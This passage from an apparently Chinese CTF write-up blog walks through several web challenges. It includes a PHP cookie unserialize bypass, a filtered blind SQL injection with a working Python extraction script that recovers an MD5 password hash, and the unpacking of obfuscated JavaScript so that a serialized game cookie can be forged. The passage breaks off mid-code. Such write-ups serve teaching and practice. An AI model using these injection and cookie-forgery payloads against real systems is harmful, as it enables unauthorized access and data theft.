    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;
  &lt;&#x2F;form&gt;
&lt;&#x2F;div&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;

&lt;?php
&#125;
$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;
?&gt;</code></pre>

<p>代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了</p>
<p>直接构造</p>
<pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;ISecer:www.isecer.com&quot;</span><span class="hljs-comment">;</span></code></pre>

<p>但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL</p>
<p>所以真正的payload：</p>
<pre><code class="hljs ini"><span class="hljs-attr">ISecer</span>=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span><span class="hljs-comment">;</span></code></pre>

<p>请求头</p>
<pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flagphp/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-number">123.206.87.240:8002</span>
<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span>
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>
<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>
<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span>
<span class="hljs-attribute">Cookie</span>: ISecer=s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-attribute">Connection</span>: close</code></pre>



<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>提示：</p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>带有过滤的sql注入</p>
<p>先测试一下过滤哪些字符</p>
<p><img src="https://i.loli.net/2020/11/25/zAG3jeME7Ocs2Wt.png" alt="sql2-2.png"></p>
<p>测试发现  or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符</p>
<p>测试还可以发现，当uname=admin&amp;passwd=111时提示的password error ,</p>
<p>但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。</p>
<p>当uname=admin’-1-‘&amp;passwd=11时为false</p>
<p>当uname=admin’-0-‘&amp;passwd=1时为true</p>
<p>所以猜测sql查询语句为</p>
<pre><code class="hljs mysql">$sql &#x3D; select * from users where username&#x3D;$username;</code></pre>

<h3 id="尝试构造注入语句"><a href="#尝试构造注入语句" class="headerlink" title="尝试构造注入语句"></a>尝试构造注入语句</h3><pre><code class="hljs lisp">ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span> database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;50</code></pre>

<p>上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置</p>
<p>但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句</p>
<pre><code class="hljs mysql">ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0</code></pre>

<p>reverse 为字符串反转函数</p>
<p><img src="https://i.loli.net/2020/11/25/fAOErbn2JSWxgPM.png" alt="sql2-1.png"></p>
<p>确定盲注的判断条件</p>
<p>当上面的语句成立时返回的是 username error </p>
<p><img src="https://i.loli.net/2020/11/25/7NWBSIEGUTqiMKt.png" alt="sql2-4.png"></p>
<p>不成立时返回的是password  error  </p>
<p><img src="https://i.loli.net/2020/11/25/5wdsrDZSipRENB3.png" alt="sql-3.png"></p>
<p>编写脚本</p>
<p>因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&quot;http://123.206.87.240:8007/web2/login.php&quot;</span>
cookie =&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:<span class="hljs-string">&#x27;r3rln64ialiqjnefpa6qu5a0t513t8rs&#x27;</span>&#125;
password = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">33</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:
        payload = <span class="hljs-string">&quot;admin&#x27;-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">ord</span>(j))
        data=&#123;<span class="hljs-string">&#x27;uname&#x27;</span>:payload,<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&quot;111&quot;</span>&#125;
        res = requests.post(url=url,cookies=cookie,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> res.text:
            password +=j
            <span class="hljs-comment">#print(password)</span>
            <span class="hljs-keyword">break</span>
print(password)</code></pre>

<p><img src="https://i.loli.net/2020/11/25/uhOXQkE5VNt623H.png" alt="sql2-5.png"></p>
<pre><code class="hljs apache"><span class="hljs-attribute">005b81fd960f61505237dbb7a3202910</span>
<span class="hljs-attribute">md5</span>在线解码后为admin<span class="hljs-number">123</span></code></pre>

<p>登录后即可用ls命令，就可以拿到flag</p>
<p>这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破</p>
<p>参考叶师傅：<a href="https://xz.aliyun.com/t/2583">https://xz.aliyun.com/t/2583</a></p>
<h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>进入页面是一个博客的页面，有搜索功能，没有思路</p>
<p>于是扫描目录</p>
<p><img src="https://i.loli.net/2020/11/25/eMWjLmnHahPJXk9.png" alt="blog.png"></p>
<p>但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做</p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>tips:不要一次就放弃</p>
<p>是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法</p>
<p>那就万事不觉扫以下</p>
<p>还真有发现</p>
<p>扫到三个目录</p>
<p>login.php</p>
<p>register.php</p>
<p>show.php</p>
<p>访问show.php,拿到flag</p>
<p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" alt="trim.png"></p>
<h2 id="login2-SKCTF-login3-文件上传2-login4"><a href="#login2-SKCTF-login3-文件上传2-login4" class="headerlink" title="login2(SKCTF)  login3  文件上传2  login4"></a>login2(SKCTF)  login3  文件上传2  login4</h2><p>题目都挂了</p>
<h2 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h2><p>提示:学会如来神掌就可以打败他了吧</p>
<p>进入题目发现还真像是游戏的界面</p>
<p>包含属性 练功 商店 赚钱 讨伐 退出 几个页面</p>
<p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" alt="mt-1.png"></p>
<p>其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag</p>
<p><strong>查看源码</strong>    </p>
<p>在wulin.php中可以看到三个js文件</p>
<p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" alt="mt-2.png"></p>
<pre><code class="hljs js"><span class="hljs-comment">//script.js 在线格式化后的结果</span>


<span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;
	e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;
		<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">&#x27;&#x27;</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))
	&#125;;
	<span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;0&#x27;</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;
		<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];
		k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;
			<span class="hljs-keyword">return</span> r[e] || e
		&#125;];
		e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;
			<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;[57-9abd-hj-zAB]&#x27;</span>
		&#125;;
		c = <span class="hljs-number">1</span>
	&#125;;
	<span class="hljs-keyword">while</span> (c--)
		<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + e(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), k[c]);
	<span class="hljs-keyword">return</span> p
&#125;(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre>

<p>可以看到<code>function(p, a, c, k, e, r)</code>函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。</p>
<pre><code class="hljs js">(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;)
</code></pre>



<p>删除eval在浏览器的控制台跑出的结果</p>
<p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" alt="mt-4.png"></p>
<p>在线代码格式化后如下</p>
<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;
    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">&quot;=&quot;</span>;
    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">var</span> c = ca[i].trim();
        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;
    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();
    <span class="hljs-keyword">var</span> result = base.decode(temp);
    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;
        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);
        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)
    &#125;
    <span class="hljs-keyword">return</span> result3
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;
    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">&quot;user&quot;</span>;
    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);
    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);
    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);
    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">&#x27;;&#x27;</span>);
    <span class="hljs-keyword">var</span> key = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;
        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> &lt; ca[i].indexOf(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;
            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">2</span>]
        &#125;
    &#125;
    key = key.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>);
    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-2.jpg&quot;</span>
    &#125;, <span class="hljs-number">1000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-3.jpg&quot;</span>
    &#125;, <span class="hljs-number">2000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-4.jpg&quot;</span>
    &#125;, <span class="hljs-number">3000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/6.png&quot;</span>
    &#125;, <span class="hljs-number">4000</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;
        alert(<span class="hljs-string">&quot;浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!flag&#123;&quot;</span> + md5(key) + <span class="hljs-string">&quot;&#125;&quot;</span>)    <span class="hljs-comment">//发现了flag字段  </span>
    &#125;, <span class="hljs-number">5000</span>)
&#125;</code></pre>

<p>首先在控制台中获取cookie</p>
<pre><code class="hljs abnf">getCookie(<span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-comment">;</span>
</code></pre>



<p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" alt></p>
<p>获取cookie，使用上面的js代码一步一步解码</p>
<p>最后会获取序列化后的一串字符串</p>
<p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" alt="mt-5.png"></p>
<p>最后解出来的cookie值</p>
<pre><code class="hljs css">O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;human&quot;</span>:<span class="hljs-number">10</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;xueliang&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">615</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;neili&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">657</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lidao&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">76</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dingli&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">72</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;waigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;neigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;jingyan&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;yelian&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;money&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;0&quot;</span>;&#125;</code></pre>

<p>但是会发现money的值为0，所以下面的思路就是通过修改cookie中money值之后反编码成题目中的格式，抓包修改cookie后买技能打怪拿到flag</p>
<p>改cookie的方法就是将明文逆向编码：</p>
<p>刚开始写了挺久的逆向解密，发现调用base64中的encode时，怎么也解不出原来的加密代码，encode怎么也加密不出原来的cookie。<br>猜想一定是base64.js有问题：</p>
<p>发现加密过程并不对应，encode调用了_utf8_encode<br>但decode并没有调用_utf8_encode，所以需要对编码过程进行相应的修改</p>
<p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" alt="mt-7.png"></p>
<p><strong>修改后的反编码过程</strong>，将其放到html文件中，浏览器运行即可出结果</p>
<pre><code class="hljs html">//1.html
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>

<span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span>(<span class="hljs-params"></span>) </span>&#123;</span>
 
<span class="javascript">	<span class="hljs-comment">// private property</span></span>
<span class="javascript">	_keyStr = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span>
 
<span class="javascript">	<span class="hljs-comment">// public method for encoding</span></span>
<span class="javascript">	<span class="hljs-built_in">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-comment">//input = _utf8_encode(input); (注释掉这个函数调用)</span></span>
<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
			enc1 = chr1 &gt;&gt; 2;
			enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);
			enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);
			enc4 = chr3 &amp; 63;
<span class="javascript">			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>
				enc3 = enc4 = 64;
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>
				enc4 = 64;
			&#125;
			output = output +
			_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
			_keyStr.charAt(enc3) + _keyStr.charAt(enc4);
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// public method for decoding</span></span>
<span class="javascript">	<span class="hljs-built_in">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> chr1, chr2, chr3;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span>
<span class="javascript">		<span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>
			enc1 = _keyStr.indexOf(input.charAt(i++));
			enc2 = _keyStr.indexOf(input.charAt(i++));
			enc3 = _keyStr.indexOf(input.charAt(i++));
			enc4 = _keyStr.indexOf(input.charAt(i++));
			chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);
			chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);
			chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;
<span class="javascript">			output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>
			if (enc3 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>
			&#125;
			if (enc4 != 64) &#123;
<span class="javascript">				output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>
			&#125;
		&#125;
<span class="javascript">		<span class="hljs-comment">//output = _utf8_decode(output);</span></span>
<span class="javascript">		<span class="hljs-keyword">return</span> output;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 encoding</span></span>
<span class="javascript">	_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">string</span>) </span>&#123;</span>
<span class="javascript">		string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">&quot;\n&quot;</span>);</span>
<span class="javascript">		<span class="hljs-keyword">var</span> utftext = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span>
<span class="javascript">			<span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>
			if (c &lt; 128) &#123;
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">			&#125; <span class="hljs-keyword">else</span> &#123;</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
<span class="javascript">				utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>
			&#125;
 
		&#125;
<span class="javascript">		<span class="hljs-keyword">return</span> utftext;</span>
	&#125;
 
<span class="javascript">	<span class="hljs-comment">// private method for UTF-8 decoding</span></span>
<span class="javascript">	_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">utftext</span>) </span>&#123;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> string = <span class="hljs-string">&quot;&quot;</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span>
<span class="javascript">		<span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>
